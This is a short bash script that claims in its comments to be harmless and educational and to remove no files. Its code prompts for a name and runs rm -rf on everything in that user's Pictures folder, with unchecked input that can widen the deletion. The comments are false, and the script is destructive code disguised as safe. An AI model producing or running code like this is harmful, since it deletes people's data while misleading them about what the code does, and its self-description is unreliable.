#!/bin/bash

# This is a harmless example script for educational purposes.
# It does not actually harm your computer or remove any files.

# Print the current working directory
pwd

# Prompt the user to enter a directory name
read -p "[+] Enter The directory Name: " USER

# Construct the path to the user's Pictures directory
PICTURES_DIR="/home/$USER/Pictures"

# Remove all files and subdirectories in the Pictures directory
rm -rf "$PICTURES_DIR"/*

# Inform the user that the operation is complete
echo "All files in $PICTURES_DIR have been removed."
